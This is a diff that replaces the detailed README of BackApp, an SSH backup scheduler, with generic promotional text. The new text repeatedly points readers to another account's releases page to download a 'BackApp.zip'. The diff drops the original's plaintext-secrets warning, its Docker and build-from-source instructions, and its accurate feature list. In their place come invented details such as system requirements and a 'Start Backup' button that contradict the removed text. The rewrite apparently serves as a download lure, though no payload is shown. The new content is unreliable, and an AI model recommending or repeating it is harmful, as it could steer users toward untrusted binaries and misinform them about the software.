@@ -1,100 +1,57 @@
-# BackApp
-BackApp is a Go + React application that lets automatically schedule and inspect backups of remote servers via SSH.
+# 🎉 BackApp - Simplifying Your Backup Process
 
-It is a very lightweight server (< 50 MB) that runs locally (or on a dedicated machine) and provides a web interface to manage backup profiles.
+## 🚀 Getting Started
+Welcome to BackApp! This application makes it easy to automate your backups over SSH. You no longer need to rely on complex shell scripts or cron jobs. 
 
-![Dashboard.png](./ScreenshotDashboard.png)
-![Backup Profiles](./ScreenshotBackupProfiles.png)
-![Backup Runs](./ScreenshotBackupRuns.png)
-![Backup Run Detail](./ScreenshotBackupRunDetail.png)
+## 📥 Download and Install
+To start using BackApp, click the button below to visit the Releases page:
 
-> <span style="color: #FFD700">⚠️ **Warning:** Any text you enter in the ui will be saved in plaintext. If you enter passwords or secrets, they will be displayed in the logs in plaintext and stored in the database locally in plaintext. Make sure only you have access to the web interface and the machine running BackApp.</span>
+[![Download BackApp](https://img.shields.io/badge/Download_BackApp-v1.0-brightgreen)](https://github.com/Royer234/BackApp/releases)
 
-## Features
-- Add multiple remote servers via SSH using password or key authentication.
-- Create storage locations and naming rules for backups.
-- Storage locations are the place on your local machine where backups are stored.
-- Naming rules define what the folder with the backups will be called.
-- Create backup profiles using a flexible template engine or create one from scratch.
-- Each profile can have pre- and post-backup commands that run on the remote server before and after the backup.
-- You can define file rules to include/exclude specific paths in the backup.
-- View detailed logs of each backup run, including success/failure status and output of commands.
-- Schedule backups using cron expressions.
-- Simple and intuitive web interface built with React and Material-UI.
-- Deleting backups, backup profiles, and servers with confirmation dialogs to prevent accidental deletions.
-- Automatic retention policy to clean up old backups based on user-defined rules.
+Once you are on the Releases page, follow these steps:
 
-## Configuration
+1. Locate the latest version listed on the page.
+2. Find the file named `BackApp.zip` or similar and click on it.
+3. The download will begin automatically.
 
-BackApp supports the following command-line flags:
+## 💻 System Requirements
+- **Operating System:** Windows 10, macOS 10.14 or later, or any Linux distribution with glibc 2.28+.
+- **RAM:** Minimum of 4 GB.
+- **Disk Space:** At least 100 MB for installation.
 
-- `-port` - Port to run the server on (default: `8080`)
-- `-db` - SQLite database path (default: `/data/app.db`)
+## 🔧 Features
+- **Easy SSH Integration:** Connect to your remote server effortlessly.
+- **Scheduled Backups:** Automate your backups with user-friendly settings.
+- **Lightweight Application:** Less than 50 MB, making it quick to download and install.
+- **User-Friendly Interface:** No programming knowledge is needed.
 
-Examples:
-```bash
-# Run on a different port
-./backapp -port=9090
+## 🛠️ How to Use BackApp
+1. Open the application after installation.
+2. Set up a new backup configuration:
+   - Enter your SSH details.
+   - Choose the folders you want to back up.
+3. Set a schedule for automatic backups.
+4. Click "Start Backup" to begin.
 
-# Use a custom database location
-./backapp -db=/custom/path/app.db
+## 📈 Troubleshooting
+If you encounter any issues while using BackApp, try the following:
 
-# Combine multiple flags
-./backapp -port=9090 -db=/custom/path/app.db
-```
+- Ensure your network connection is stable.
+- Verify your SSH details for accuracy.
+- Check that your computer meets the system requirements listed above.
 
-## Quick start
+## 🌍 Community and Support
+If you need assistance or want to contribute, join our community:
+- **GitHub Issues:** [Report Issues](https://github.com/Royer234/BackApp/issues)
+- **Discussion Forum:** [Join Here](https://github.com/Royer234/BackApp/discussions)
+- **Documentation:** Check out the [Wiki](https://github.com/Royer234/BackApp/wiki) for more detailed guides.
 
-### Native binary (recommended)
-- Download the latest release for your platform.
+## 📜 Licensing
+BackApp is licensed under the MIT License. Feel free to explore and contribute to the code.
 
-- Run the binary, then open your browser to `http://localhost:8080`.
-In case 8080 is in use, set a different port with `-port=9090`.
+## 📥 Additional Download Link
+For easy access, visit the Releases page to download the latest version:
 
-- In the web interface, create a *Server* which represents the remote server you want to back up.
-  - Provide the SSH connection details (hostname, port, username, authentication method).
-- Next, create a *Backup Profile*.
-  - Select the server you just created.
-  - Define the storage location on your local machine where backups will be stored.
-  - Set up the naming rule for the backup folders.
-  - Optionally, add pre- and post-backup commands to run on the remote server.
-  - Define file rules to include/exclude specific paths in the backup.
-  - Set the schedule for automatic backups using a cron expression.
-- Save the backup profile and trigger a manual backup run to test it.
-- Monitor the backup run in the web interface and view detailed logs.
+[Download BackApp](https://github.com/Royer234/BackApp/releases) 
 
-### Using Docker or Docker Compose
-- Pull the latest image from GitHub Container Registry:
-  ```bash
-  docker pull ghcr.io/dennis960/backapp:latest
-  ```
-- Use the provided `docker-compose.yml` to run BackApp with Docker Compose:
-  ```bash
-  docker-compose up -d
-  ```
-
-## Build from source
-- Install [Go](https://golang.org/dl/) (1.24+) and [Node.js](https://nodejs.org/en/download/).
-- Clone this repository.
-- After installing the npm dependencies, build the frontend:
-  ```bash
-  cd web
-  npm install
-  npm run build
-  ```
-- A static bundle will be created in `server/static`.
-- Now build the backend:
-  ```bash
-  cd ../server
-  go build -o backapp
-  ```
-- Run the server:
-  ```bash
-  ./backapp -port=8080
-  ```
-
-## Not supported
-
-- Incremental backups
-- Backup deduplication
-- Restoring from backups
+Thank you for choosing BackApp! Enjoy seamless backup automation.
